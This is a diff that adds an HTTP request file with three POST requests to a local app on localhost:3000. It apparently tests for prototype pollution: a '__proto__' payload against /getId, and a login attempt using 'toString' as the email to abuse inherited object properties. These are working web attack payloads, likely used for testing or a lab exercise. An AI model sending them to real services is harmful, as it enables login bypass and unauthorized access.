@@ -1,0 +1,29 @@
+@url = http://localhost:3000
+
+POST {{url}}/getId HTTP/1.1
+Content-Type: application/json
+
+{
+  "__proto__": {
+    "id": "p"
+  }
+}
+
+###
+
+POST {{url}}/getId HTTP/1.1
+Content-Type: application/json
+
+{
+  "email": "anoa an"
+}
+
+###
+
+POST {{url}}/login HTTP/1.1
+Content-Type: application/json
+
+{
+  "email": "toString",
+  "password": "a"
+}
